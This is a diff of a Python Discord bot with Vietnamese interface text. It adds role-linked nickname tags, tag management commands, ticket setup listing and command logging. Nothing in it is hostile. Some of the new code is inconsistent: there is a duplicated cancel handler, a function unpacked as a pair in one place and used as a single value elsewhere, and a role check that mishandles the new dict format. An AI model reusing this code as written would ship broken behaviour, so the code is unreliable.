+    await send_dm_notification(user, "/ticket", guild_name, "Slash Command")
+    
+# -------------------
+# /setup-list command
+# -------------------
+@bot.tree.command(name="setup-list", description="Hiện danh sách setup ticket")
+async def setup_list(interaction: discord.Interaction):
+    if not interaction.user.guild_permissions.administrator:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+        
+    cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+    setups = cfg.get("setups", [])
+    if not setups:
+        return await interaction.response.send_message(
+            embed=discord.Embed(
+                title="📋 Danh sách Setup",
+                description="Hiện chưa có setup nào.\nDùng `/setup` để thêm mới.",
+                color=discord.Color.red()
+            ),
+            ephemeral=True
+        )
+
+    embed = discord.Embed(
+        title="📋 Danh sách Setup",
+        description="Chọn một setup trong dropdown bên dưới để quản lý.",
+        color=discord.Color.blurple()
+    )
+    view = SetupDropdownView(setups)
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+    
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/setup-list", guild_name, "Slash Command")
+    await send_dm_notification(user, "/setup-list", guild_name, "Slash Command")
+    
 class ConfirmView(discord.ui.View):
-    def __init__(self, member: discord.Member, role_key: str):
+    def __init__(self, member: discord.Member, tag_name: str, role_id: int):
         super().__init__()
         self.member = member
-        self.role_key = role_key
+        self.tag_name = tag_name
+        self.role_id = role_id
 
     @discord.ui.button(label="Có", style=discord.ButtonStyle.green)
     async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
-        role_id = ROLES[self.role_key]["role_id"]
-        role = discord.utils.get(self.member.guild.roles, id=role_id)
-        if role in self.member.roles:
-            # 🔹 Lấy prefix từ ROLE_PRIORITY
-            prefix = ""
-            for r_key, r_prefix in ROLE_PRIORITY:
-                if r_key == self.role_key:
-                    prefix = r_prefix
+        role = discord.utils.get(self.member.guild.roles, id=self.role_id)
+        if role and role in self.member.roles:
+            # Lấy emoji của tag - CHỈ LẤY EMOJI, KHÔNG UNPACK
+            emoji = extract_name_and_emoji_from_tag(self.tag_name)
+            emoji_display = ""
+            
+            if emoji:
+                if isinstance(emoji, discord.PartialEmoji):
+                    emoji_display = str(emoji) + " "  # Custom emoji
+                else:
+                    emoji_display = emoji + " "  # Unicode emoji
+            
+            # Lấy nickname hiện tại (loại bỏ tag cũ nếu có)
+            current_nick = self.member.display_name
+            
+            # Xóa tất cả tag cũ từ tag_data
+            tag_data = load_json(TAG_FILE)
+            for old_tag in tag_data.keys():
+                old_emoji = extract_name_and_emoji_from_tag(old_tag)  # CHỈ LẤY EMOJI
+                old_emoji_display = ""
+                
+                if old_emoji:
+                    if isinstance(old_emoji, discord.PartialEmoji):
+                        old_emoji_display = str(old_emoji) + " "
+                    else:
+                        old_emoji_display = old_emoji + " "
+                
+                # Xóa cả phần có emoji và không có emoji
+                old_prefix_with_emoji = f"{old_emoji_display}[{old_tag}]"
+                old_prefix_without_emoji = f"[{old_tag}]"
+                
+                if current_nick.startswith(old_prefix_with_emoji):
+                    current_nick = current_nick.replace(old_prefix_with_emoji, "").strip()
                     break
-
-            # 🔹 Xoá prefix cũ nếu có
-            original_name = self.member.display_name
-            for _, old_prefix in ROLE_PRIORITY:
-                if original_name.startswith(old_prefix):
-                    original_name = original_name[len(old_prefix):].strip()
+                elif current_nick.startswith(old_prefix_without_emoji):
+                    current_nick = current_nick.replace(old_prefix_without_emoji, "").strip()
                     break
-
-            # 🔹 Gắn prefix mới
-            new_nick = f"{prefix} {original_name}"
+            
+            # Tạo nickname mới với tag và emoji
+            new_nick = f"{emoji_display}[{self.tag_name}] {current_nick}"
+            
             try:
+                # Giới hạn độ dài nickname (Discord limit: 32 characters)
+                if len(new_nick) > 32:
+                    # Cắt bớt tên gốc để vừa với tag
+                    max_original_len = 32 - len(f"{emoji_display}[{self.tag_name}] ") - 3  # -3 cho "..."
+                    original_name = current_nick[:max_original_len] + "..."
+                    new_nick = f"{emoji_display}[{self.tag_name}] {original_name}"
+                
                 await self.member.edit(nick=new_nick)
                 await interaction.response.send_message(
                     f"✅ Đổi nickname thành **{new_nick}**",
@@ -623,36 +2172,81 @@ class ConfirmView(discord.ui.View):
     async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_message("❌ Hủy chọn", ephemeral=True)
         self.stop()
+
+    @discord.ui.button(label="Không", style=discord.ButtonStyle.red)
+    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_message("❌ Hủy chọn", ephemeral=True)
+        self.stop()
         
 class RoleSelect(discord.ui.Select):
     def __init__(self, member: discord.Member):
         self.member = member
         options = []
 
-        # Chỉ thêm role mà member đang có
-        for key, item in ROLES.items():
-            role = discord.utils.get(member.guild.roles, id=item["role_id"])
-            if role and role in member.roles:
-                emoji, label = extract_name_and_emoji(item["name"])
-                options.append(discord.SelectOption(
-                    label=label,
-                    value=key,
-                    description=f"Chọn {label}",
-                    emoji=emoji
-                ))
+        # Load tag data từ file tag.json
+        tag_data = load_json(TAG_FILE)
+        if not tag_data:
+            options.append(discord.SelectOption(
+                label="Lỗi tải tag",
+                value="error",
+                description="Không thể tải dữ liệu tag"
+            ))
+        else:
+            # Chỉ thêm tag mà member đang có role
+            for tag_name, tag_info in tag_data.items():
+                # Lấy role_id từ cả format cũ và mới
+                role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+                role = discord.utils.get(member.guild.roles, id=role_id)
+                
+                if role and role in member.roles:
+                    # CHỈ LẤY EMOJI (dùng hàm mới hoặc hàm đã sửa)
+                    emoji = get_tag_emoji_for_dropdown(tag_name)
+                    
+                    option = discord.SelectOption(
+                        label=tag_name,
+                        value=tag_name,
+                        description=f"Chọn {tag_name}",
+                        emoji=emoji  # THÊM EMOJI VÀO DROPDOWN
+                    )
+                    
+                    options.append(option)
 
         super().__init__(placeholder="Chọn tag...", min_values=1, max_values=1, options=options)
-
+        
     async def callback(self, interaction: discord.Interaction):
-        selected_key = self.values[0]
-        role_name = ROLES[selected_key]["name"]
+        selected_tag = self.values[0]
+        
+        # Load lại tag data để lấy role_id
+        tag_data = load_json(TAG_FILE)
+        tag_info = tag_data.get(selected_tag)
+        
+        if not tag_info:
+            await interaction.response.send_message("❌ Không tìm thấy tag!", ephemeral=True)
+            return
+        
+        # Lấy role_id từ cả format cũ và mới
+        role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+        
+        if not role_id:
+            await interaction.response.send_message("❌ Không tìm thấy role cho tag này!", ephemeral=True)
+            return
+
+        # Lấy emoji để hiển thị
+        emoji = extract_name_and_emoji_from_tag(selected_tag)
+        emoji_display = ""
+        
+        if emoji:
+            if isinstance(emoji, discord.PartialEmoji):
+                emoji_display = str(emoji) + " "
+            else:
+                emoji_display = emoji + " "
 
         embed = discord.Embed(
             title="Xác nhận",
-            description=f"Bạn có muốn chọn tag **{role_name}** không?",
+            description=f"Bạn có muốn chọn tag {emoji_display}**{selected_tag}** không?",
             color=discord.Color.blue()
         )
-        await interaction.response.send_message(embed=embed, view=ConfirmView(self.member, selected_key), ephemeral=True)
+        await interaction.response.send_message(embed=embed, view=ConfirmView(self.member, selected_tag, role_id), ephemeral=True)
         
 class RoleView(discord.ui.View):
     def __init__(self, member: discord.Member):
@@ -677,11 +2271,21 @@ async def tag(interaction: discord.Interaction):
         await interaction.response.send_message("❌ Không tìm thấy thành viên!", ephemeral=True)
         return
 
-    # 🔥 THÊM ĐOẠN KIỂM TRA NÀY
+    # Load tag data từ file
+    tag_data = load_json(TAG_FILE)
+    if not tag_data:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Không thể tải dữ liệu tag!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Kiểm tra xem user có bất kỳ role nào trong tag_data không
     has_any_role = False
-    for key, item in ROLES.items():
-        role_id = shop_data.get(key, {}).get("role_id")
-        role = guild.get_role(role_id) if role_id else None
+    for role_id in tag_data.values():
+        role = guild.get_role(role_id)
         if role and role in member.roles:
             has_any_role = True
             break
@@ -689,7 +2293,7 @@ async def tag(interaction: discord.Interaction):
     if not has_any_role:
         embed = discord.Embed(
             title="❌ Không có tag",
-            description="Bạn không có bất kỳ tag nào để chọn!",
+            description="Bạn không có bất kỳ tag nào để chọn!\nHãy mua role trong shop để có tag.",
             color=discord.Color.red()
         )
         await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -702,7 +2306,13 @@ async def tag(interaction: discord.Interaction):
     )
     await interaction.response.send_message(embed=embed, view=RoleView(member), ephemeral=True)
     
-@bot.tree.command(name="resettag", description="Xóa tag prefix khỏi nickname của bạn")
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/tag", guild_name, "Slash Command")
+    await send_dm_notification(user, "/tag", guild_name, "Slash Command")
+    
+@bot.tree.command(name="reset-tag", description="Xóa tag prefix khỏi nickname của bạn")
 async def resettag(interaction: discord.Interaction):
     if is_user_banned(interaction.user.id):
         embed = discord.Embed(
@@ -720,25 +2330,309 @@ async def resettag(interaction: discord.Interaction):
         await interaction.response.send_message("❌ Không tìm thấy thành viên!", ephemeral=True)
         return
 
-    # 🔹 Xoá prefix cũ nếu có
-    original_name = member.display_name
-    for _, old_prefix in ROLE_PRIORITY:
-        if original_name.startswith(old_prefix):
-            original_name = original_name[len(old_prefix):].strip()
+    # Load tag data từ file
+    tag_data = load_json(TAG_FILE)
+    if not tag_data:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Không thể tải dữ liệu tag!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # 🔹 Xoá tất cả tag và emoji từ nickname
+    current_nick = member.display_name
+    original_name = current_nick
+    
+    for tag_name in tag_data.keys():
+        # Lấy emoji của tag
+        emoji, _ = extract_name_and_emoji_from_tag(tag_name)
+        emoji_display = ""
+        
+        if emoji:
+            if isinstance(emoji, discord.PartialEmoji):
+                emoji_display = str(emoji) + " "
+            else:
+                emoji_display = emoji + " "
+        
+        # Xóa cả phần có emoji và không có emoji
+        prefix_with_emoji = f"{emoji_display}[{tag_name}]"
+        prefix_without_emoji = f"[{tag_name}]"
+        
+        if current_nick.startswith(prefix_with_emoji):
+            original_name = current_nick.replace(prefix_with_emoji, "").strip()
             break
+        elif current_nick.startswith(prefix_without_emoji):
+            original_name = current_nick.replace(prefix_without_emoji, "").strip()
+            break
+
+    # Nếu không thay đổi, có nghĩa là không có tag
+    if original_name == current_nick:
+        embed = discord.Embed(
+            title="ℹ️ Thông báo",
+            description="Nickname của bạn không có tag nào để xóa!",
+            color=discord.Color.blue()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        
+        # Log
+        user = f"{interaction.user.name}#{interaction.user.discriminator}"
+        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+        log_command(user, "/reset-tag", guild_name, "Slash Command")
+        await send_dm_notification(user, "/reset-tag", guild_name, "Slash Command")
+        return
 
     try:
         await member.edit(nick=original_name)
-        await interaction.response.send_message(
-            f"✅ Đã reset nickname thành **{original_name}**",
-            ephemeral=True
+        embed = discord.Embed(
+            title="✅ Đã xóa tag",
+            description=f"Nickname của bạn đã được reset về:\n**{original_name}**",
+            color=discord.Color.green()
         )
-    except discord.Forbidden:
-        await interaction.response.send_message(
-            "❌ Bot không có quyền đổi nickname (có thể là owner hoặc role cao hơn bot)", 
-            ephemeral=True
-        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
         
+    except discord.Forbidden:
+        embed = discord.Embed(
+            title="❌ Lỗi quyền",
+            description="Bot không có quyền đổi nickname của bạn!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description=f"Đã xảy ra lỗi: {str(e)}",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/reset-tag", guild_name, "Slash Command")
+    await send_dm_notification(user, "/reset-tag", guild_name, "Slash Command")
+    
+class TagDropdown(discord.ui.Select):
+    def __init__(self, tags):
+        options = []
+        for tag_name, tag_info in tags.items():
+            # Lấy role_id từ cả format cũ và mới
+            role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+            
+            # Lấy emoji để hiển thị
+            emoji = extract_name_and_emoji_from_tag(tag_name)
+            
+            label = tag_name
+            if emoji:
+                if isinstance(emoji, discord.PartialEmoji):
+                    label = f"{emoji} {tag_name}"
+                else:
+                    label = f"{emoji} {tag_name}"
+            
+            options.append(discord.SelectOption(
+                label=label[:25],  # Giới hạn độ dài
+                value=tag_name,
+                description=f"Role ID: {role_id}"
+            ))
+        
+        super().__init__(placeholder="Chọn tag để quản lý...", min_values=1, max_values=1, options=options)
+
+    async def callback(self, interaction: discord.Interaction):
+        selected_tag = self.values[0]
+        tag_data = load_json(TAG_FILE)
+        tag_info = tag_data[selected_tag]
+        
+        # Lấy role_id từ cả format cũ và mới
+        role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+        role = interaction.guild.get_role(role_id)
+        
+        # Lấy emoji để hiển thị
+        emoji = extract_name_and_emoji_from_tag(selected_tag)
+        emoji_display = str(emoji) if emoji else "Không có"
+        
+        embed = discord.Embed(
+            title=f"🏷️ Thông tin tag: {selected_tag}",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="👤 Role", value=role.mention if role else "Không tìm thấy", inline=True)
+        embed.add_field(name="🎨 Emoji", value=emoji_display, inline=True)
+        embed.add_field(name="🆔 Role ID", value=role_id, inline=True)
+        
+        await interaction.response.send_message(
+            embed=embed, 
+            view=TagActionView(selected_tag), 
+            ephemeral=True
+        )
+
+class TagDropdownView(discord.ui.View):
+    def __init__(self, tags):
+        super().__init__(timeout=120)
+        self.add_item(TagDropdown(tags))
+
+class TagActionView(discord.ui.View):
+    def __init__(self, tag_name):
+        super().__init__(timeout=120)
+        self.tag_name = tag_name
+
+    @discord.ui.button(label="✏️ Chỉnh sửa", style=discord.ButtonStyle.blurple)
+    async def edit_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(EditTagModal(self.tag_name))
+
+    @discord.ui.button(label="🗑️ Xóa", style=discord.ButtonStyle.red)
+    async def delete_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_user_allowed(interaction.user.id):
+            await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+            return
+        
+        tag_data = load_json(TAG_FILE)
+        if self.tag_name in tag_data:
+            del tag_data[self.tag_name]
+            save_json(TAG_FILE, tag_data)
+            
+            embed = discord.Embed(
+                title="✅ Đã xóa tag",
+                description=f"Đã xóa tag **{self.tag_name}**",
+                color=discord.Color.green()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        else:
+            await interaction.response.send_message("❌ Tag không tồn tại!", ephemeral=True)
+
+class EditTagModal(discord.ui.Modal, title="Chỉnh sửa Tag"):
+    new_name = discord.ui.TextInput(label="Tên tag mới", placeholder="Nhập tên tag mới", required=True)
+    new_icon = discord.ui.TextInput(label="Icon mới", placeholder="Emoji unicode hoặc :name:id", required=False)
+
+    def __init__(self, tag_name):
+        super().__init__()
+        self.tag_name = tag_name
+        # Pre-fill current values
+        tag_data = load_json(TAG_FILE)
+        if tag_name in tag_data:
+            tag_info = tag_data[tag_name]
+            self.new_name.default = tag_name
+            
+            # Pre-fill icon nếu có
+            if isinstance(tag_info, dict) and tag_info.get("icon"):
+                icon_data = tag_info["icon"]
+                if icon_data["type"] == "custom":
+                    self.new_icon.default = f":{icon_data['name']}:{icon_data['id']}"
+                else:
+                    self.new_icon.default = icon_data["emoji"]
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if not is_user_allowed(interaction.user.id):
+            await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+            return
+
+        tag_data = load_json(TAG_FILE)
+        if self.tag_name not in tag_data:
+            await interaction.response.send_message("❌ Tag không tồn tại!", ephemeral=True)
+            return
+
+        new_name = str(self.new_name.value).strip()
+        new_icon = str(self.new_icon.value).strip() if self.new_icon.value else None
+
+        # Kiểm tra tên mới không trùng
+        if new_name != self.tag_name and new_name in tag_data:
+            await interaction.response.send_message("❌ Tên tag đã tồn tại!", ephemeral=True)
+            return
+
+        # Lấy dữ liệu tag cũ
+        old_tag_info = tag_data[self.tag_name]
+        
+        # Xử lý icon mới
+        icon_data = None
+        if new_icon:
+            if new_icon.startswith('<:') and new_icon.endswith('>'):
+                try:
+                    emoji_parts = new_icon[2:-1].split(':')
+                    if len(emoji_parts) == 2:
+                        emoji_name, emoji_id = emoji_parts
+                        icon_data = {"type": "custom", "name": emoji_name, "id": int(emoji_id)}
+                except:
+                    pass
+            elif ':' in new_icon and not new_icon.startswith('<'):
+                try:
+                    emoji_parts = new_icon.split(':')
+                    if len(emoji_parts) == 2:
+                        emoji_name, emoji_id = emoji_parts
+                        icon_data = {"type": "custom", "name": emoji_name, "id": int(emoji_id)}
+                except:
+                    pass
+            else:
+                icon_data = {"type": "unicode", "emoji": new_icon}
+
+        # Tạo dữ liệu tag mới
+        if isinstance(old_tag_info, int):
+            # Format cũ -> chuyển sang format mới
+            new_tag_info = {
+                "role_id": old_tag_info,
+                "icon": icon_data
+            }
+        else:
+            # Format mới -> giữ nguyên role_id
+            new_tag_info = {
+                "role_id": old_tag_info.get("role_id"),
+                "icon": icon_data
+            }
+
+        # Xóa tag cũ và thêm tag mới
+        del tag_data[self.tag_name]
+        tag_data[new_name] = new_tag_info
+        save_json(TAG_FILE, tag_data)
+
+        embed = discord.Embed(
+            title="✅ Đã cập nhật tag",
+            description=f"Đã cập nhật tag **{self.tag_name}** → **{new_name}**",
+            color=discord.Color.green()
+        )
+        if icon_data:
+            embed.add_field(name="🎨 Icon mới", value=new_icon, inline=False)
+        
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="tag-list", description="Xem danh sách tag và quản lý")
+async def tag_list(interaction: discord.Interaction):
+    """Hiển thị danh sách tag với nút chỉnh sửa"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    tag_data = load_json(TAG_FILE)
+    if not tag_data:
+        embed = discord.Embed(
+            title="🏷️ Danh sách Tag",
+            description="Chưa có tag nào trong hệ thống.",
+            color=discord.Color.blue()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="🏷️ Danh sách Tag",
+        description="Chọn một tag trong dropdown bên dưới để quản lý.",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name="📊 Tổng số tag", value=len(tag_data), inline=True)
+    
+    await interaction.response.send_message(
+        embed=embed, 
+        view=TagDropdownView(tag_data), 
+        ephemeral=True
+    )
+    
+    # Log
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/tag-list", guild_name, "Slash Command")
+    await send_dm_notification(user, "/tag-list", guild_name, "Slash Command")
+    
 # Slash Command - Bancmd: Cấm người dùng sử dụng bot
 @bot.tree.command(name="bancmd", description="Cấm người dùng sử dụng bot")
 @app_commands.describe(user_id="ID của người dùng cần cấm", reason="Lý do cấm")
@@ -812,6 +2706,532 @@ async def bancmd(interaction: discord.Interaction, user_id: str, reason: str):
         )
         await interaction.response.send_message(embed=error_embed, ephemeral=True)
 
+class GiveTagView(discord.ui.View):
+    def __init__(self, user: discord.Member, tag_data: dict):
+        super().__init__(timeout=60)
+        self.add_item(GiveTagSelect(user, tag_data))
+        
+class GiveTagSelect(discord.ui.Select):
+    def __init__(self, user: discord.Member, tag_data: dict):
+        self.user = user
+        self.tag_data = tag_data
+        
+        options = []
+        
+        # Thêm tất cả tag có sẵn
+        for tag_name, tag_info in tag_data.items():
+            # Lấy role_id từ cả format cũ và mới
+            role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+            role = discord.utils.get(user.guild.roles, id=role_id)
+            
+            if role:
+                # CHỈ LẤY EMOJI (không unpack)
+                emoji = extract_name_and_emoji_from_tag(tag_name)
+                
+                option = discord.SelectOption(
+                    label=tag_name,  # Dùng tên tag làm label
+                    value=tag_name,
+                    description=f"Give {tag_name} to {user.display_name}"
+                )
+                
+                # Thêm emoji nếu có
+                if emoji:
+                    option.emoji = emoji
+                
+                options.append(option)
+        
+        super().__init__(
+            placeholder="🎯 Chọn tag để give...",
+            min_values=1,
+            max_values=1,
+            options=options
+        )
+
+    async def callback(self, interaction: discord.Interaction):
+        selected_tag = self.values[0]
+        tag_info = self.tag_data[selected_tag]
+        
+        # Lấy role_id từ cả format cũ và mới
+        role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+        role = discord.utils.get(self.user.guild.roles, id=role_id)
+        
+        if not role:
+            await interaction.response.send_message("❌ Role không tồn tại!", ephemeral=True)
+            return
+        
+        # Kiểm tra xem user đã có role này chưa
+        if role in self.user.roles:
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description=f"{self.user.mention} đã có role {role.mention}!",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        
+        try:
+            # Thêm role cho user
+            await self.user.add_roles(role)
+            
+            # Lấy emoji để hiển thị - CHỈ LẤY EMOJI
+            emoji = extract_name_and_emoji_from_tag(selected_tag)
+            emoji_display = ""
+            
+            if emoji:
+                if isinstance(emoji, discord.PartialEmoji):
+                    emoji_display = str(emoji) + " "
+                else:
+                    emoji_display = emoji + " "
+            
+            embed = discord.Embed(
+                title="✅ Đã give tag",
+                description=f"Đã give tag {emoji_display}**{selected_tag}** cho {self.user.mention}",
+                color=discord.Color.green()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            
+        except discord.Forbidden:
+            embed = discord.Embed(
+                title="❌ Lỗi quyền",
+                description="Bot không có quyền thêm role cho user này!",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description=f"Đã xảy ra lỗi: {str(e)}",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+
+class RemoveUserTagSelect(discord.ui.Select):
+    def __init__(self, user: discord.Member, tag_data: dict):
+        self.user = user
+        self.tag_data = tag_data
+        
+        options = []
+        
+        # Chỉ thêm tag mà user đang có
+        for tag_name, tag_info in tag_data.items():
+            # Lấy role_id từ cả format cũ và mới
+            role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+            role = discord.utils.get(user.guild.roles, id=role_id)
+            
+            if role and role in user.roles:
+                # CHỈ LẤY EMOJI (không unpack)
+                emoji = extract_name_and_emoji_from_tag(tag_name)
+                
+                option = discord.SelectOption(
+                    label=tag_name,  # Dùng tên tag làm label
+                    value=tag_name,
+                    description=f"Remove {tag_name} from {user.display_name}"
+                )
+                
+                # Thêm emoji nếu có
+                if emoji:
+                    option.emoji = emoji
+                
+                options.append(option)
+        
+        super().__init__(
+            placeholder="🎯 Chọn tag để remove...",
+            min_values=1,
+            max_values=1,
+            options=options
+        )
+
+    async def callback(self, interaction: discord.Interaction):
+        selected_tag = self.values[0]
+        tag_info = self.tag_data[selected_tag]
+        
+        # Lấy role_id từ cả format cũ và mới
+        role_id = tag_info if isinstance(tag_info, int) else tag_info.get("role_id")
+        role = discord.utils.get(self.user.guild.roles, id=role_id)
+        
+        if not role:
+            await interaction.response.send_message("❌ Role không tồn tại!", ephemeral=True)
+            return
+        
+        # Kiểm tra xem user có role này không
+        if role not in self.user.roles:
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description=f"{self.user.mention} không có role {role.mention}!",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+        
+        try:
+            # Xóa role khỏi user
+            await self.user.remove_roles(role)
+            
+            # Lấy emoji để hiển thị - CHỈ LẤY EMOJI
+            emoji = extract_name_and_emoji_from_tag(selected_tag)
+            emoji_display = ""
+            
+            if emoji:
+                if isinstance(emoji, discord.PartialEmoji):
+                    emoji_display = str(emoji) + " "
+                else:
+                    emoji_display = emoji + " "
+            
+            embed = discord.Embed(
+                title="✅ Đã remove tag",
+                description=f"Đã remove tag {emoji_display}**{selected_tag}** khỏi {self.user.mention}",
+                color=discord.Color.green()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            
+        except discord.Forbidden:
+            embed = discord.Embed(
+                title="❌ Lỗi quyền",
+                description="Bot không có quyền xóa role khỏi user này!",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description=f"Đã xảy ra lỗi: {str(e)}",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            
+class RemoveUserTagView(discord.ui.View):
+    def __init__(self, user: discord.Member, tag_data: dict):
+        super().__init__(timeout=60)
+        self.add_item(RemoveUserTagSelect(user, tag_data))
+        
+@bot.tree.command(name="add-tag", description="Thêm tag mới vào hệ thống")
+@app_commands.describe(
+    role="Role để gắn với tag",
+    name="Tên của tag (hiển thị trong dropdown)",
+    icon="Emoji unicode hoặc custom emoji (ví dụ: 🐷, :vip:123456789)"
+)
+async def add_tag(interaction: discord.Interaction, role: discord.Role, name: str, icon: str = None):
+    """Thêm tag mới vào file tag.json với icon tùy chọn"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Load tag data hiện tại
+    tag_data = load_json(TAG_FILE)
+    
+    # Kiểm tra xem role đã tồn tại chưa - XỬ LÝ CẢ FORMAT CŨ VÀ MỚI
+    for existing_tag, existing_data in tag_data.items():
+        # FORMAT CŨ: existing_data là số (role_id)
+        if isinstance(existing_data, int):
+            if existing_data == role.id:
+                embed = discord.Embed(
+                    title="❌ Lỗi",
+                    description=f"Role {role.mention} đã được gắn với tag **{existing_tag}**!",
+                    color=discord.Color.red()
+                )
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+        # FORMAT MỚI: existing_data là dictionary
+        elif isinstance(existing_data, dict):
+            if existing_data.get("role_id") == role.id:
+                embed = discord.Embed(
+                    title="❌ Lỗi",
+                    description=f"Role {role.mention} đã được gắn với tag **{existing_tag}**!",
+                    color=discord.Color.red()
+                )
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+    
+    # Kiểm tra xem tên tag đã tồn tại chưa
+    if name in tag_data:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description=f"Tag **{name}** đã tồn tại!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Xử lý icon
+    icon_data = None
+    if icon:
+        # Kiểm tra nếu là custom emoji (dạng <:name:id> hoặc :name:id)
+        if icon.startswith('<:') and icon.endswith('>'):
+            # Format: <:name:id>
+            try:
+                emoji_parts = icon[2:-1].split(':')
+                if len(emoji_parts) == 2:
+                    emoji_name, emoji_id = emoji_parts
+                    icon_data = {
+                        "type": "custom",
+                        "name": emoji_name,
+                        "id": int(emoji_id)
+                    }
+            except Exception as e:
+                await interaction.response.send_message(
+                    embed=discord.Embed(
+                        title="❌ Lỗi",
+                        description=f"Custom emoji không hợp lệ: {e}",
+                        color=discord.Color.red()
+                    ),
+                    ephemeral=True
+                )
+                return
+        elif ':' in icon and not icon.startswith('<'):
+            # Format: :name:id
+            try:
+                emoji_parts = icon.split(':')
+                if len(emoji_parts) == 2:
+                    emoji_name, emoji_id = emoji_parts
+                    icon_data = {
+                        "type": "custom", 
+                        "name": emoji_name,
+                        "id": int(emoji_id)
+                    }
+            except Exception as e:
+                await interaction.response.send_message(
+                    embed=discord.Embed(
+                        title="❌ Lỗi",
+                        description=f"Custom emoji không hợp lệ: {e}",
+                        color=discord.Color.red()
+                    ),
+                    ephemeral=True
+                )
+                return
+        else:
+            # Unicode emoji
+            icon_data = {
+                "type": "unicode",
+                "emoji": icon
+            }
+
+    # Thêm tag mới với FORMAT MỚI
+    tag_data[name] = {
+        "role_id": role.id,
+        "icon": icon_data
+    }
+    
+    save_json(TAG_FILE, tag_data)
+    
+    # Tạo mô tả icon cho embed
+    icon_description = "Không có icon"
+    if icon_data:
+        if icon_data["type"] == "custom":
+            icon_description = f"Custom emoji: {icon_data['name']} (ID: {icon_data['id']})"
+        else:
+            icon_description = f"Unicode emoji: {icon_data['emoji']}"
+    
+    embed = discord.Embed(
+        title="✅ Đã thêm tag",
+        description=f"Đã thêm tag **{name}** với role {role.mention}",
+        color=discord.Color.green()
+    )
+    embed.add_field(name="🎨 Icon", value=icon_description, inline=False)
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    # Log
